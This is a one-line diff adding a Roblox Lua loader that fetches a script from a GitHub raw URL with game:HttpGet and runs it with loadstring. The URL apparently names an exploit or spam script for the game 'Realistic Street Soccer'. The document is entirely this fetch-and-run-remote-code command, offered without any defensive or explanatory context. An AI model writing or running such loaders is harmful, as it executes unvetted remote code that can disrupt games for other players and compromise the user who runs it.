@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/realistic-street-soccer-spam3-zsmo7tl9mjb0ke.lua"))()
